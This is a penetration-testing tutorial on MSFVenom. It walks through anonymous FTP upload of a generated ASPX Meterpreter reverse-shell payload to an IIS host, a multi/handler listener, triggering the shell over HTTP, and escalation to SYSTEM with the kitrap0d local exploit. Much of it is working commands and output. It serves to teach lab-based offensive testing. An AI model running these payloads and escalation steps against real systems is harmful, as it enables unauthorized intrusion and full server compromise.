

# Introduction to MSFVenom

**MSFVenom** is a Metasploit utility used to **generate payloads** for exploitation. It is the successor to two older tools:

* **MSFPayload** – used to generate raw shellcode
* **MSFEncode** – used to encode payloads to remove bad characters and evade basic detection

MSFVenom combines both tools into a **single, streamlined payload-generation framework**.

---

## Why MSFVenom Exists

Before MSFVenom:

* Payloads had to be piped manually from `msfpayload` to `msfencode`
* Encoding was required to:

  * Remove bad characters
  * Evade older AV and IDS/IPS systems
* This process was error-prone and inefficient

With MSFVenom:

* Payload generation and encoding are unified
* Payloads can be tailored for:

  * OS
  * Architecture
  * Payload type
  * Output format
* Bad characters and encoders can be handled in one step

---

## Modern AV Evasion Reality

Encoding alone **no longer guarantees evasion**.

Modern defenses use:

* Heuristic analysis
* Behavioral detection
* Machine learning
* Memory inspection
* Deep packet inspection

As demonstrated in payload testing:

* Simple encoded payloads are still detected more than 80% of the time
* Encoding improves stability, not guaranteed stealth

MSFVenom should be viewed as:

* A **payload delivery tool**
* Not a silver bullet for AV evasion

---

## Attack Scenario Overview

Assume the following conditions:

* FTP service allows **anonymous login**
* FTP root is mapped to a web-accessible directory
* Web server executes uploaded scripts
* No file-type validation is enforced

This allows:

* Uploading a server-side payload
* Triggering it via HTTP
* Receiving a reverse shell

---

## Target Enumeration

### Nmap Scan

```
nmap -sV -T4 -p- 10.10.10.5
```

Results:

* FTP (21) – Microsoft FTP
* HTTP (80) – Microsoft IIS 7.5
* OS – Windows

---

## FTP Anonymous Login

```
ftp 10.10.10.5
Name: anonymous
Password: anything
```

Directory listing shows:

```
aspnet_client
iisstart.htm
welcome.png
```

The presence of `aspnet_client` indicates:

* The server supports **ASP.NET**
* `.aspx` payloads can be executed

---

## Generating a Payload with MSFVenom

### ASPX Meterpreter Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 \
LPORT=1337 \
-f aspx > reverse_shell.aspx
```

Key points:

* Payload: Windows Meterpreter reverse TCP
* Format: ASPX (for IIS)
* Architecture: Auto-selected (x86)
* Output: Executable ASP.NET page

---

## Preparing the Listener

Before triggering the payload, a listener must be active.

### Multi/Handler Setup

```
msfconsole -q
use multi/handler
set LHOST 10.10.14.5
set LPORT 1337
run
```

This handler:

* Waits for incoming reverse connections
* Does not exploit anything itself

---

## Executing the Payload

Triggering the payload:

```
http://10.10.10.5/reverse_shell.aspx
```

What happens:

* The page appears blank
* The ASPX code executes server-side
* A reverse connection is sent to Metasploit

---

## Meterpreter Session Obtained

```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

This user:

* Has limited privileges
* Cannot perform administrative actions
* Requires privilege escalation

---

## Handling Unstable Sessions

If the session dies frequently:

* Encoding may help reduce runtime errors
* Architecture mismatches are a common cause
* Payload staging can fail under memory constraints

---

## Local Privilege Escalation with Exploit Suggester

### Why Use It

* The current user is low-privileged
* OS is Windows x86
* Kernel-level exploits may be applicable

### Running the Module

```
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
run
```

The module:

* Enumerates OS, patches, privileges
* Matches applicable local exploits
* Outputs potential escalation paths

---

## Choosing an Exploit

One valid option:

```
exploit/windows/local/ms10_015_kitrap0d
```

This exploit:

* Targets a kernel vulnerability
* Escalates privileges to SYSTEM
* Works on x86 Windows systems

---

## Executing the Privilege Escalation

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <session_id>
set LHOST tun0
set LPORT 1338
run
```

---

## SYSTEM Access Achieved

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

At this point:

* Full system compromise is achieved
* Credential dumping, persistence, and lateral movement are possible

---

## Key Takeaways

* MSFVenom is used for **payload creation**, not exploitation
* Output format must match the target environment
* Always start a listener before triggering payloads
* Web shells may appear blank but still execute
* Low-privilege shells are expected
* Local Exploit Suggester accelerates privilege escalation
* Not all suggested exploits will work; testing is required

---



